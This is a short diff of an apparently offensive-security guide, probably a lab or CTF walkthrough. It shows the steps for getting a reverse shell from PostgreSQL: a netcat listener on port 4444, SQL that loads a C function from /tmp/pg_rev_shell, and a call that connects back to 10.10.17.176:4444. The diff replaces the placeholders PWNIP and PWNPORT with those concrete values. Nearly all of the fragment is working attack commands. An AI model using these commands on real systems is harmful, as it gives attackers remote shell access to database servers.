@@ -836,7 +836,7 @@ nc -nvlp 4444
 2. **SQL Execution:** If performing the steps manually via a SQL prompt, use the following commands:
    ```sql
    CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
-   SELECT rev_shell('PWNIP', PWNPORT);
+   SELECT rev_shell('10.10.17.176', 4444);
 ```
 ---
 
